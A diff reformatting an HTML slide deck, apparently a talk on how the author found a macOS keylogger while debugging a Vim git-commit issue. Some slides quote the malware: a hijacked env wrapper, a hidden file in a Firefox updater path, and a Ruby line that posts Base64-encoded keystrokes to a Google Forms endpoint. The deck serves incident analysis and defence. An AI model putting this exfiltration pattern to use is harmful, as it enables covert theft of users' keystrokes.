@@ -1,72 +1,98 @@
 ---
-permalink: '/vim-keylogger-presentation'
+permalink: "/vim-keylogger-presentation"
 ---
 
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-
 	<head>
-		<meta charset="utf-8">
+		<meta charset="utf-8" />
 
 		<title>Vim as an Anti-Keylogger</title>
 
-		<meta name="description" content="How debuggging a Vim plugin made me discover a keylogger">
-		<meta name="author" content="nobe4">
+		<meta
+			name="description"
+			content="How debuggging a Vim plugin made me discover a keylogger"
+		/>
+		<meta name="author" content="nobe4" />
 
-		<meta name="apple-mobile-web-app-capable" content="yes">
-		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta
+			name="apple-mobile-web-app-status-bar-style"
+			content="black-translucent"
+		/>
 
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta
+			name="viewport"
+			content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+		/>
 
-		<link rel="stylesheet" href="assets/vim-keylogger-presentation/css/reveal.css">
-		<link rel="stylesheet" href="assets/vim-keylogger-presentation/css/black.css" id="theme">
+		<link
+			rel="stylesheet"
+			href="assets/vim-keylogger-presentation/css/reveal.css"
+		/>
+		<link
+			rel="stylesheet"
+			href="assets/vim-keylogger-presentation/css/black.css"
+			id="theme"
+		/>
 
 		<!-- Theme used for syntax highlighting of code -->
-		<link rel="stylesheet" href="assets/vim-keylogger-presentation/css/zenburn.css">
+		<link
+			rel="stylesheet"
+			href="assets/vim-keylogger-presentation/css/zenburn.css"
+		/>
 
 		<!--[if lt IE 9]>
-		<script src="assets/vim-keylogger-presentation/js/html5shiv.js"></script>
+			<script src="assets/vim-keylogger-presentation/js/html5shiv.js"></script>
 		<![endif]-->
 	</head>
 
 	<body>
-
 		<div class="reveal">
-
 			<div class="slides">
-
 				<section>
-					<h2>Vim as an anti-keylogger</h1>
+					<h1>Vim as an anti-keylogger</h1>
 					<p class="fragment">or</p>
-					<h2 class="fragment">How debugging a Vim plugin made me discover a keylogger</h1>
+					<h2 class="fragment">
+						How debugging a Vim plugin made me discover a keylogger
+					</h2>
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/cat.gif">
+				<section
+					data-background="assets/vim-keylogger-presentation/img/cat.gif"
+				>
 					<h2>Once Upon A Shell...</h2>
 				</section>
-				
+
 				<section>
-				
-					<img src="assets/vim-keylogger-presentation/img/tpope.jpeg" alt="">
-					<br>
+					<img src="assets/vim-keylogger-presentation/img/tpope.jpeg" alt="" />
+					<br />
 					<a href="https://github.com/tpope/vim-fugitive">
-						<img src="assets/vim-keylogger-presentation/img/fugitive.png" alt="">
+						<img
+							src="assets/vim-keylogger-presentation/img/fugitive.png"
+							alt=""
+						/>
 					</a>
-
 				</section>
 
 				<section>
-				
-					<img src="assets/vim-keylogger-presentation/img/gcommit1.png" alt="" width="400">
-					<img src="assets/vim-keylogger-presentation/img/gcommit2.png" alt="" width="400">
-
+					<img
+						src="assets/vim-keylogger-presentation/img/gcommit1.png"
+						alt=""
+						width="400"
+					/>
+					<img
+						src="assets/vim-keylogger-presentation/img/gcommit2.png"
+						alt=""
+						width="400"
+					/>
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/archeologist.gif">
-				</section>
+				<section
+					data-background="assets/vim-keylogger-presentation/img/archeologist.gif"
+				></section>
 
 				<section>
-
 					<pre><code data-trim>
 $ env GIT_EDITOR=false git commit 2> errorfile
 					</code></pre>
@@ -75,7 +101,6 @@ $ env GIT_EDITOR=false git commit 2> errorfile
 error: There was a problem with the editor 'false'.
 Please supply the message using either -m or -F option.
 					</code></pre>
-				
 				</section>
 
 				<section>
@@ -97,7 +122,6 @@ USER=victor
 				</section>
 
 				<section>
-				
 					<pre><code data-trim>
 $ which env
 /usr/local/bin/env
@@ -112,10 +136,13 @@ $ /usr/local/bin/env
 $ /usr/bin/env
 # OK !
 					</code></pre>
-				
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/batman.gif" data-background-size="500px" data-background-repeat="repeat">
+				<section
+					data-background="assets/vim-keylogger-presentation/img/batman.gif"
+					data-background-size="500px"
+					data-background-repeat="repeat"
+				>
 					<h2>Here comes the node...</h2>
 				</section>
 
@@ -143,8 +170,6 @@ try{
 } catch(e) { }
 					</code></pre>
 				</section>
-
-
 
 				<section>
 					<pre><code data-trim>
@@ -231,7 +256,6 @@ while true do
   end
 end
 					</code></pre>
-
 				</section>
 				<section>
 					<pre><code data-trim>
@@ -242,30 +266,34 @@ while true do
 end
 					</code></pre>
 
-					<p>Which is the 80% the same code <br>
-					as this <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb">metasploit module</a></p>
-
+					<p>
+						Which is the 80% the same code <br />
+						as this
+						<a
+							href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb"
+							>metasploit module</a
+						>
+					</p>
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/freakout.gif" data-background-repeat="repeat">
+				<section
+					data-background="assets/vim-keylogger-presentation/img/freakout.gif"
+					data-background-repeat="repeat"
+				>
 					<h2>Time to freak out!</h2>
 				</section>
 
-
 				<section>
-
 					<h4>Some details</h4>
-					 <pre><code>Carbon</code></pre>
+					<pre><code>Carbon</code></pre>
 
 					<pre><code data-trim>
 Net::HTTP.start('docs.google.com', : use_ssl => true) { | connection |
 res = connection.post('/forms/d/e/***/formResponse', "entry.***=#{Base64.urlsafe_encode64(s)}")
 					</code></pre>
-				
 				</section>
 
 				<section>
-
 					<h5>Anything else ?</h5>
 
 					<pre><code data-trim>
@@ -277,64 +305,78 @@ Applications/FirefoxDeveloperEdition.app/Contents/MacOS/updater.app/Contents/Mac
 /Applications/FirefoxDeveloperEdition.app/Contents/MacOS/updater.app/Contents/MacOS/.org.mozilla.updater "$@"
 					</code></pre>
 
-					<img src="assets/vim-keylogger-presentation/img/ohno.gif" alt="">
+					<img src="assets/vim-keylogger-presentation/img/ohno.gif" alt="" />
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/help.gif">
+				<section
+					data-background="assets/vim-keylogger-presentation/img/help.gif"
+				>
 					<h2>What now?</h2>
 				</section>
 
 				<section>
-				
-					<a href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/"> I asked the internet about it </a>
-					<br>
-					<img src="assets/vim-keylogger-presentation/img/reddit.png" alt="">
-				
+					<a
+						href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/"
+					>
+						I asked the internet about it
+					</a>
+					<br />
+					<img src="assets/vim-keylogger-presentation/img/reddit.png" alt="" />
 				</section>
 
 				<section>
-				
 					<blockquote>
-						First, use something like HandsOff or Little Snitch to monitor the applications on your system that opens outgoing connections. (<a href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib8ti2/">pilibitti</a>)
+						First, use something like HandsOff or Little Snitch to monitor the
+						applications on your system that opens outgoing connections. (<a
+							href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib8ti2/"
+							>pilibitti</a
+						>)
 					</blockquote>
 
 					<blockquote>
-						[...] if you want to do more forensics on your system, use the free tools provided by https://objective-see.com/ (<a href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib8ti2/">pilibitti</a>)
+						[...] if you want to do more forensics on your system, use the free
+						tools provided by https://objective-see.com/ (<a
+							href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib8ti2/"
+							>pilibitti</a
+						>)
 					</blockquote>
 
 					<blockquote>
-						"Take off and nuke the site from orbit. It's the only way to be sure". (<a href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dibqesk/">Chaoslab</a>, reference to the <a href="https://www.youtube.com/watch?v=aCbfMkh940Q">1986's Aliens movie</a>)
+						"Take off and nuke the site from orbit. It's the only way to be
+						sure". (<a
+							href="https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dibqesk/"
+							>Chaoslab</a
+						>, reference to the
+						<a href="https://www.youtube.com/watch?v=aCbfMkh940Q"
+							>1986's Aliens movie</a
+						>)
 					</blockquote>
-				
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/explosion.gif">
-				</section>
+				<section
+					data-background="assets/vim-keylogger-presentation/img/explosion.gif"
+				></section>
 
 				<section>
-
 					<h2>Lessons Learned</h2>
 					<p class="fragment"><strong>Do</strong> understand your tools</p>
 					<p class="fragment"><strong>Do</strong> monitor what is going on</p>
-					<p class="fragment"><strong>Do</strong> protect yourself </p>
-					<p class="fragment"><strong>Do not</strong> click on stuff </p>
-					<p class="fragment"><strong>Do not</strong> go on the internet </p>
-					<p class="fragment"><strong>Do not</strong> use your computer </p>
-
+					<p class="fragment"><strong>Do</strong> protect yourself</p>
+					<p class="fragment"><strong>Do not</strong> click on stuff</p>
+					<p class="fragment"><strong>Do not</strong> go on the internet</p>
+					<p class="fragment"><strong>Do not</strong> use your computer</p>
 				</section>
 
-				<section data-background="assets/vim-keylogger-presentation/img/end.gif">
-				</section>
-
+				<section
+					data-background="assets/vim-keylogger-presentation/img/end.gif"
+				></section>
 			</div>
-
 		</div>
 
 		<script src="assets/vim-keylogger-presentation/js/head.min.js"></script>
 		<script src="assets/vim-keylogger-presentation/js/reveal.js"></script>
 
 		<script>
-
 			Reveal.initialize({
 				controls: false,
 				progress: true,
@@ -343,12 +385,15 @@ Applications/FirefoxDeveloperEdition.app/Contents/MacOS/updater.app/Contents/Mac
 
 				// More info https://github.com/hakimel/reveal.js#dependencies
 				dependencies: [
-					{ src: 'assets/vim-keylogger-presentation/js/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
-				]
+					{
+						src: "assets/vim-keylogger-presentation/js/highlight.js",
+						async: true,
+						callback: function () {
+							hljs.initHighlightingOnLoad();
+						},
+					},
+				],
 			});
-
 		</script>
-
 	</body>
-
 </html>
